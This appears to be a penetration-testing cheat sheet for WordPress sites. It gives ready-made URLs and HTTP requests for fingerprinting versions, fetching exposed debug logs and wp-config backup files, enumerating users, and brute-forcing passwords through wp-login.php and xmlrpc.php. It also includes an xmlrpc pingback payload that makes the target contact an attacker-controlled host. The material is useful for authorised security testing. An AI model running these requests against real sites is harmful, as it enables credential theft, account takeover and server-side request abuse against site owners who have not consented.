# WordPress Common Bugs

## Introduction
What would you do if you came across a website that uses WordPress?

## How to Detect
If you visit `https://target.com` and see the source code, you will see the links to themes and plugins from WordPress. Or you can visit `https://target.com/wp-login.php`, it is the WordPress login admin page

1. Find the related CVE by checking the core, plugins, and theme version
* How to find the wordpress version
```
https://target.com/feed
https://target.com/?feed=rss2
```

* How to find the plugin version
```
https://target.com/wp-content/plugins/PLUGINNAME/readme.txt
https://target.com/wp-content/plugins/PLUGINNAME/readme.TXT
https://target.com/wp-content/plugins/PLUGINNAME/README.txt
https://target.com/wp-content/plugins/PLUGINNAME/README.TXT
```

> or change readme.txt to changelog.txt or readme.md

* How to find the theme version
```
https://target.com/wp-content/themes/THEMENAME/style.css
https://target.com/wp-content/themes/THEMENAME/readme.txt (If they have readme file)
```
If you found outdated core / plugins / themes, find the exploit at https://wpscan.com

2. Finding log files
```
http://target.com/wp-content/debug.log
```

3. Finding backup file wp-config
```
http://target.com/.wp-config.php.swp
http://target.com/wp-config.inc
http://target.com/wp-config.old
http://target.com/wp-config.txt
http://target.com/wp-config.html
http://target.com/wp-config.php.bak
http://target.com/wp-config.php.dist
http://target.com/wp-config.php.inc
http://target.com/wp-config.php.old
http://target.com/wp-config.php.save
http://target.com/wp-config.php.swp
http://target.com/wp-config.php.txt
http://target.com/wp-config.php.zip
http://target.com/wp-config.php.html
http://target.com/wp-config.php~
```

4. Get the username on the website
```
http://target.com/?author=1
```
or
```
http://target.com/wp-json/wp/v2/users
http://target.com/?rest_route=/wp/v2/users
```

5. Bruteforce
```
POST /wp-login.php HTTP/1.1
Host: target.com

log=admin&pwd=BRUTEFORCE_IN_HERE&wp-submit=Log+In&redirect_to=http%3A%2F%2Ftarget.com%2Fwp-admin%2F&testcookie=1
```
or
```
POST /xmlrpc.php HTTP/1.1
Host: target.com

<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>admin</value></param> 
<param><value>BRUTEFORCE_IN_HERE</value></param> 
</params> 
</methodCall>
```

6. XSPA in wordpress
```
POST /xmlrpc.php HTTP/1.1
Host: target.com

<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://yourip:port</string></value>
</param><param>
<value>
<string>https://target.com></string>
</value>
</param></params>
</methodCall>
```

7. Register enabled
```
http://example.com/wp-login.php?action=register
```